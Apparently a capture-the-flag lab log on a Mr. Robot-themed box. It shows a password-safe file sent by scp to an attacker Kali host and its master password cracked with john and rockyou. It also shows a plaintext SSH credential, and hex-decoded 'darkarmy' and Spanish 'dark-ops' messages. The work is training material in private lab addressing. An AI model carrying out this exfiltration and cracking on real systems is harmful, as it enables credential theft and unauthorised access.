HeBiDQ60DTPrnLyI3wa44VRpepMt/OVQIXa12eYN5t6MFoecD50Cmlh6qFJkgSG1Q4zG8YNWNLUR
sYwg3yblzhe+7x03F8CLxFRm/S20C+N17sIpqKYU1m51KDnLxi3Du9pZPoNXLsp6FPMAGhUZfH8u
FNWDJyIQTOYgJ++DYSvwdUozJCMdT054qR0y6M0RfEKESEgoMkSnyWBAl23ya/akvUlhlCnUEY32
5mc7oUbTB+LBQBEakCEG1Uj3yAI/XwZ/kSahFpph5QIIX5Kk8H6YWdMj65jYAIk8e15xlQu//Wln
wsXu7ypOlnR8/SgAdLnyj7mGG0VwatTSbaJzJET0iH0QPG+Zijz8+1vHTm0TKcnItD9/wnxTh7/1
wic04+YaadZB9zep9EFSzCu8wAs9jyhorsfFHbPDE6260eiEYhEgFgWF7kYEwruw0RoS+GpzgXVD
WCv2w4xwXTHguJAxwEDkqE892xbaxUa7S7D6qgON+l86mtwCjvPs8f9fAAbLFBUaCQbGo3WtFuWU
2bw3WOfWhcR5+GMKUFdTMy1FT0ZQV1MzLUVPRi+iuHIQimVmVcDapvOJpPJpaWVVtCNJ7gDGJK4G
cCi7
# ls
secrets.psafe3


=============================================================================================================================================================================================

# scp secrets.psafe3 kali@10.0.250.5:/home/kali/Documents/mrRobot/

# scp secrets.psafe3 kali@10.0.250.5:/home/kali/Documents/mrRobot/


# passwd
New password: 
Retype new password: 
passwd: password updated successfully


# scp secrets.psafe3 kali@10.0.250.5:/home/kali/Documents/mrRobot/
The authenticity of host '10.0.250.5 (10.0.250.5)' can't be established.
ED25519 key fingerprint is SHA256:ITDL7jCHFLTPzaK1+kaob4/YTYLjdV6XzG8K2OxAD6g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.0.250.5' (ED25519) to the list of known hosts.
kali@10.0.250.5's password: 
secrets.psafe3                                                                                                            100% 1656     2.0MB/s   00:00    
# 
=============================================================================================================================================================================================





┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ pwsafe2john secrets.psafe3 > hash.txt
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ cat hash.txt  
secret:$pwsafe$*3*c2c939945133efa3686bcc5f75d5db7cd3cdecded79a534ca63a0c75faae1563*262144*6d84e3e89a22f99b44b5a77c13bb05ac917fde833d0e9979e506c3919efdaca6
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/mrRobot]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt      
Using default input encoding: UTF-8
Loaded 1 password hash (pwsafe, Password Safe [SHA256 256/256 AVX2 8x])
Cost 1 (iteration count) is 262144 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
rockandroll      (secret)     
1g 0:00:00:40 DONE (2025-09-18 12:09) 0.02495g/s 153.3p/s 153.3c/s 153.3C/s newzealand..iheartyou
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 






=============================================================================================================================================================================================

ssh


cisco

sMpam!dE#8@$$1P%bnV@fFxdqjFFG#

=============================================================================================================================================================================================


┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ ssh cisco@10.0.250.8    
cisco@10.0.250.8's password: 
Linux allsafe 6.1.0-26-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.112-1 (2024-09-30) x86_64
███╗   ███╗██████╗        ██████╗  ██████╗ ██████╗  ██████╗ ████████╗
████╗ ████║██╔══██╗       ██╔══██╗██╔═══██╗██╔══██╗██╔═══██╗╚══██╔══╝
██╔████╔██║██████╔╝       ██████╔╝██║   ██║██████╔╝██║   ██║   ██║   
██║╚██╔╝██║██╔══██╗       ██╔══██╗██║   ██║██╔══██╗██║   ██║   ██║   
██║ ╚═╝ ██║██║  ██║██╗    ██║  ██║╚██████╔╝██████╔╝╚██████╔╝   ██║   
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝    ╚═╝  ╚═╝ ╚═════╝ ╚═════╝  ╚═════╝    ╚═╝   
Last login: Fri Aug 22 23:59:20 2025 from 192.168.1.19
cisco@allsafe:~$ ls
darkarmy.bin
cisco@allsafe:~$ cat darkarmy.bin 
70617373776f72643d64726b32303235210a
cisco@allsafe:~$ 

=============================================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ python3 gohash.py 


     ██████╗  ██████╗       ██╗  ██╗ █████╗ ███████╗██╗  ██╗
    ██╔════╝ ██╔═══██╗      ██║  ██║██╔══██╗██╔════╝██║  ██║
    ██║  ███╗██║   ██║█████╗███████║███████║███████╗███████║
    ██║   ██║██║   ██║╚════╝██╔══██║██╔══██║╚════██║██╔══██║
    ╚██████╔╝╚██████╔╝      ██║  ██║██║  ██║███████║██║  ██║
     ╚═════╝  ╚═════╝       ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝
            <<------ C O D E   B Y   H U N X ------>>
                       < Hash identified >

  [+] Enter Your Hash : 70617373776f72643d64726b32303235210a

  ===================== Show Algorithm Hash ====================

  [+] Hash : 70617373776f72643d64726b32303235210a
  [+] Algorithm : Hex encoded string

  ==============================================================

  Do you want to identify the hash again? Y/N : N
  Exit ToolS !!!
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/Go-Hash]
└─$ echo -n "70617373776f72643d64726b32303235210a" | xxd -r -p
password=drk2025!
                                                                                                                                                            



=============================================================================================================================================================================================

cisco@allsafe:~$ ls -la
total 28
drwxr-xr-x 2 cisco cisco 4096 ago 22 17:20 .
drwxr-xr-x 4 root  root  4096 ago 21 15:30 ..
lrwxrwxrwx 1 root  root     9 ago 22 17:20 .bash_history -> /dev/null
-rw-r--r-- 1 cisco cisco  220 abr 23  2023 .bash_logout
-rw-r--r-- 1 cisco cisco 3526 abr 23  2023 .bashrc
-rw-r--r-- 1 root  root    37 ago 22 00:48 darkarmy.bin
-rw-r--r-- 1 cisco cisco  807 abr 23  2023 .profile
-rw-r--r-- 1 root  root   342 ago 22 00:38 .unknown
cisco@allsafe:~$ cat .unknown 
Si quieres comunicarte con nosotros, no vuelvas a usar los canales habituales.
A partir de ahora, todo contacto será únicamente a través del canal seguro.

Conéctate al servidor de mensajería y entra en la sala:
    dark-ops

No intentes usar este acceso para nada más que lo acordado.  
Nosotros decidimos cuándo y cómo se conversa.
cisco@allsafe:~$ 
